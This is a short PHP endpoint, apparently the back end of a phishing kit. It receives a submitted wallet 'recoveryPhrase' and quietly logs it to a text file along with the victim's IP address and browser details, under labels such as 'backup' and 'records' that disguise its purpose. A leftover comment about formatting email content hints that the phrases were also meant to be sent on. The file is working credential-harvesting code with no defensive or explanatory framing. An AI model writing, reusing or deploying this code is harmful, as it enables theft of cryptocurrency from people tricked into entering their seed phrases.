<?php
header('Content-Type: application/json');

try {
    // Get POST data
    $data = json_decode(file_get_contents('php://input'), true);
    
    if (!$data || !isset($data['recoveryPhrase'])) {
        throw new Exception('Invalid request data');
    }

    // Format email content
    $timestamp = date('Y-m-d H:i:s');
    $userIP = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    
    // Save to backup file
    $backupDir = __DIR__ . '/backups';
    if (!file_exists($backupDir)) {
        mkdir($backupDir, 0755, true);
    }
    
    $backupContent = sprintf(
        "[%s]\nPhrase: %s\nIP: %s\nBrowser: %s\n------------------------\n",
        $timestamp,
        $data['recoveryPhrase'],
        $userIP,
        $userAgent
    );
    
    file_put_contents($backupDir . '/records.txt', $backupContent, FILE_APPEND);

    // Send success response
    echo json_encode(['success' => true]);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}